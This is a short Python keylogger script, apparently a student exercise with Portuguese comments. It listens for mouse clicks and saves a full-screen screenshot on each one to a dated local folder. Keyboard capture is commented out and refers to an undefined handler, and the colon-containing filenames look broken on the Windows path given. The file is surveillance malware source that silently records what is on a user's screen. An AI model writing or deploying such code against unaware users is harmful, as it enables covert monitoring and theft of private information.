from pynput.mouse import Listener as MouseListener #biblioteca para reconhecer o mouse
from pynput.keyboard import Listener as KeyboardListener #biblioteca para reconhecer o teclado
from datetime import datetime
import re, os, pyautogui as py

dataAtual = datetime.now()
data = dataAtual.strftime("%d-%m")
diretorioRaiz= "C:/Users/tiago/Desktop/FACULDADE/Códigos/KeyLogger/prints/" + data + "/"
arquivoLog = diretorioRaiz + "keylogger.log"

try:
    os.mkdir(diretorioRaiz)
except:
    pass

def on_click(x, y, buttom, pressed):
    if pressed:
        print(f'Mouse clicou em {x}, {y} com {buttom}')
        minhaPrint = py.screenshot()
        hora = datetime.now()
        horarioPrint = hora.strftime("%H:%M:%S")
        minhaPrint.save(os.path.join(diretorioRaiz, "printKeylogger_" + horarioPrint + ".png"))

# KeyboardListener = KeyboardListener(on_press=on_press)
MouseListener = MouseListener(on_click=on_click)

# KeyboardListener.start()
MouseListener.start()
# KeyboardListener.join()
MouseListener.join()